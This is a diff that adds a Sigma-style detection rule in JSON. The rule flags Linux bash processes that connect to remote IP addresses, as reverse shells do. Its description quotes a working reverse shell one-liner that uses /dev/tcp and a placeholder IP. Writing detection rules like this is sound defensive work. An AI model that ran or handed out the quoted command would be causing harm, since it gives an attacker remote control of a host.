@@ -1,0 +1,29 @@
+{
+  "title": "Linux Reverse Shell Indicator",
+  "id": "83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871",
+  "status": "test",
+  "description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
+  "author": "Florian Roth (Nextron Systems)",
+  "date": "2021-10-16",
+  "tags": [
+    "attack.execution",
+    "attack.t1059.004"
+  ],
+  "level": "critical",
+  "logsource": {
+    "product": "linux",
+    "category": "network_connection"
+  },
+  "detection": {
+    "selection": {
+      "Image|endswith": "/bin/bash"
+    },
+    "filter": {
+      "DestinationIp": [
+        "127.0.0.1",
+        "0.0.0.0"
+      ]
+    },
+    "condition": "selection and not filter"
+  }
+}
